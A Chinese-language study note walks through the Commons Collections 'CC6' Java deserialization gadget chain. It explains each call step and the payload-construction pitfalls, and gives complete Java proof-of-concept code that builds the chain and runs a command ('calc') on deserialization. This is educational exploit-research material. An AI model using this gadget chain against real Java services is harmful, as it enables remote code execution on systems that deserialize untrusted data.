---
title: CC6链分析
description: Commons Collections 3 HashMap + TiedMapEntry 反序列化链，通过 hashCode() 触发 LazyMap.get() 和 InvokerTransformer 执行命令（无 JDK 版本限制）
tags: [cc6, commons-collections, deserialization, hashmap, tiedmapentry, lazymap]
status: 已完成
finish-date: 2026-05-17
difficulty: 困难
---

# CC6链
## 背景：
自从Java 8u71以后，官方修改了AnnotationInvocationHandler类中的readObject方法，修改后的代码可以看到不再使用我们原始的Map对象，而是新建了LinkedHashMap对象，并将键值对加入，使得后续操作都是针对于这个新的LinkedHashMap对象，使得无法触发LazyMap.get()方法，且新的方法也没有了memberValues.setValue()了，可以说CC1链没法用了。能否找到一条不经过AnnotationInvocationHandler类且能够触发LazyMap.get()方法的链子
## 调用链
```
HashMap.readObject()
HashMap.hash()
    TiedMapEntry.hashCode()
    TiedMapEntry.getValue()
        LazyMap.get()
            ChainedTransformer.transform()
                InvokerTransformer.transform()
                    Method.invoke()
                        Runtime.exec()

``` 
## 每一步方法调用详解
1. HashMap.readObject()（入口）
    URLDNS链时已经了解到反序列化时HashMap类的readObject方法会对每一个key调用hash()方法 
    ```java
    for (int i = 0; i < mappings; i++) {
        K key = (K) s.readObject();    // 读取 key
        V value = (V) s.readObject();  // 读取 value
        
        // 🔥 关键：调用 putVal，而 putVal 会调用 hash(key)
        putVal(hash(key), key, value, false, false);
        }
    ```
2. HashMap.hash()
    ```java
    static final int hash(Object key) {
        int h;
        return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
    }
    ``` 
    HashMap类的hash方法调用了hashCode方法
3. TiedMapEntry.hashCode()
    ```java
    public int hashCode() {
        Object value = getValue();
        return (getKey() == null ? 0 : getKey().hashCode()) ^
            (value == null ? 0 : value.hashCode()); 
    }
    ``` 
    TiedMapEntry类的hashCode()方法会调用该类的getValue()方法
4. TiedMapEntry.getValue()
    ```java
    public Object getValue() {
        return map.get(key);
    }
    ```
    TiedMapEntry类的getValue()方法会调用LazyMap.get() 
## 手工POC
1. 核心难点：编写CC6链时，最大的坑点在当本地生成payload，执行到hashMap.put(entry, "value")时会调用entry.hashCode()从而触发命令执行
   1. 问题1：本地意外执行命令
      ```java
      // 当你在自己的电脑上运行这段代码构造 Payload 时
      hashMap.put(entry, "value");  
      // 你的电脑会立即弹出计算器！
      ``` 
   2. 问题2：缓存污染
      ```java
      // 第一次执行 LazyMap.get("foo")
      lazyMap.get("foo");  
      // 因为 factory 被调用，执行了命令
      // 然后 LazyMap 会把结果缓存起来：map.put("foo", 执行结果)

      // 第二次执行 LazyMap.get("foo")
      lazyMap.get("foo");  
      // 直接返回缓存值，不会再调用 factory.transform()
      ```
2. 尝试运行有问题的POC
   1. ![](java-deserialization(ing)/2026-05-16-21-33-50.png)未完成序列化操作和反序列化操作
      1. hashMap.put(entry, "value") 触发了命令执行命令执行
      2. LazyMap.get() 返回的是 Process 对象（Runtime.exec() 的返回值）
      3. 这个 Process 对象被放入了 LazyMap 的缓存中序列化时需要序列化这个 Process 对象
      4. 但它没有实现 Serializable 接口所以序列化失败
   2. 改进：先将factory的值赋值为1（占位符）然后再反射改为ChainedTransformer
   3. 修改过后编译运行发现可以正常序列化和反序列化但没有执行命令
      ![](java-deserialization(ing)/2026-05-16-21-40-24.png)        
3. 调试 
   1. 调试POC
      ```java
      import java.io.ByteArrayInputStream;
      import java.io.ByteArrayOutputStream;
      import java.io.ObjectInputStream;
      import java.io.ObjectOutputStream;
      import java.lang.reflect.Field;
      import java.util.HashMap;
      import java.util.Map;
      import org.apache.commons.collections.map.LazyMap;
      import org.apache.commons.collections.Transformer;
      import org.apache.commons.collections.functors.ChainedTransformer;
      import org.apache.commons.collections.functors.ConstantTransformer;
      import org.apache.commons.collections.functors.InvokerTransformer;
      import org.apache.commons.collections.keyvalue.TiedMapEntry;

      public class CC6_Problem_Version {
         public static void main(String[] args) throws Exception {
            ConstantTransformer ct=new ConstantTransformer(Runtime.class);
            InvokerTransformer i1=new InvokerTransformer("getMethod",
                  new Class[]{String.class,Class[].class},
                  new Object[]{"getRuntime",new Class[0]}
            );
            InvokerTransformer i2=new InvokerTransformer("invoke",
                  new Class[]{Object.class,Object[].class},
                  new Object[]{null,new Object[0]}
            );
            InvokerTransformer i3=new InvokerTransformer("exec", 
                  new Class[]{String.class},
                  new Object[]{"calc"}
               );
               Transformer[] ts=new Transformer[]{ct,i1,i2,i3};
               ChainedTransformer chain=new ChainedTransformer(ts);


               HashMap map=new HashMap();
               Map lazyMap=LazyMap.decorate(map, new ConstantTransformer(1));

               TiedMapEntry entry=new TiedMapEntry(lazyMap, "key");

               HashMap entrymap=new HashMap();
               entrymap.put(entry, "value");

               Field f=lazyMap.getClass().getDeclaredField("factory");
                  f.setAccessible(true);
                  f.set(lazyMap, chain);



               ByteArrayOutputStream baos=new ByteArrayOutputStream();
               ObjectOutputStream oos=new ObjectOutputStream(baos);
               oos.writeObject(entrymap);
               oos.flush();
               oos.close();
               byte[] data=baos.toByteArray();
               System.out.println("Serialized data length: " + data.length);

               ByteArrayInputStream bais=new ByteArrayInputStream(data);
               ObjectInputStream ois=new ObjectInputStream(bais);
                  ois.readObject();
                  ois.close();
               System.out.println("Deserialization completed.");
         }
      }
      ```   
   2. 关键位置设置断点
   3. ![](java-deserialization(ing)/2026-05-16-22-11-31.png)发现到这里之后就没有按照预期在下一个预期断点![](java-deserialization(ing)/2026-05-16-22-13-33.png)处停下说明lazyMap已经在hashMap.put(entry, "value") 这会触发 entry.hashCode() → lazyMap.get("foo")有了缓存
   4. 删除缓存`lazyMap.remove("foo");`
4. 解决方法：
   1. 用假的Transformer占位：避免构造时在本地执行危险命令
   2. 清除缓存：lazyMap.remove("foo") 删除刚产生的缓存项
   3. 反射替换：把假的换成真的恶意 Transformer
5. 完整POC
   ```java 
   import java.io.ByteArrayInputStream;
   import java.io.ByteArrayOutputStream;
   import java.io.ObjectInputStream;
   import java.io.ObjectOutputStream;
   import java.lang.reflect.Field;
   import java.util.HashMap;
   import java.util.Map;
   import org.apache.commons.collections.map.LazyMap;
   import org.apache.commons.collections.Transformer;
   import org.apache.commons.collections.functors.ChainedTransformer;
   import org.apache.commons.collections.functors.ConstantTransformer;
   import org.apache.commons.collections.functors.InvokerTransformer;
   import org.apache.commons.collections.keyvalue.TiedMapEntry;

   public class CC6_Problem_Version {
      public static void main(String[] args) throws Exception {
         ConstantTransformer ct=new ConstantTransformer(Runtime.class);
         InvokerTransformer i1=new InvokerTransformer("getMethod",
               new Class[]{String.class,Class[].class},
               new Object[]{"getRuntime",new Class[0]}
         );
         InvokerTransformer i2=new InvokerTransformer("invoke",
               new Class[]{Object.class,Object[].class},
               new Object[]{null,new Object[0]}
         );
         InvokerTransformer i3=new InvokerTransformer("exec", 
               new Class[]{String.class},
               new Object[]{"calc"}
            );
            Transformer[] ts=new Transformer[]{ct,i1,i2,i3};
            ChainedTransformer chain=new ChainedTransformer(ts);


            HashMap map=new HashMap();
            Map lazyMap=LazyMap.decorate(map, new ConstantTransformer(1));

            TiedMapEntry entry=new TiedMapEntry(lazyMap, "key");

            HashMap entrymap=new HashMap();
            entrymap.put(entry, "value");

            lazyMap.remove("key");


            Field f=lazyMap.getClass().getDeclaredField("factory");
               f.setAccessible(true);
               f.set(lazyMap, chain);



            ByteArrayOutputStream baos=new ByteArrayOutputStream();
            ObjectOutputStream oos=new ObjectOutputStream(baos);
            oos.writeObject(entrymap);
            oos.flush();
            oos.close();
            byte[] data=baos.toByteArray();
            System.out.println("Serialized data length: " + data.length);

            ByteArrayInputStream bais=new ByteArrayInputStream(data);
            ObjectInputStream ois=new ObjectInputStream(bais);
               ois.readObject();
               ois.close();
            System.out.println("Deserialization completed.");
      }
   }
   ```
6. 运行验证
   ![](java-deserialization(ing)/2026-05-16-22-21-20.png)成功反序列化执行命令
## ysoserial验证
![](java-deserialization(ing)/2026-05-17-09-13-09.png)工具生成的payload也可以成功执行命令 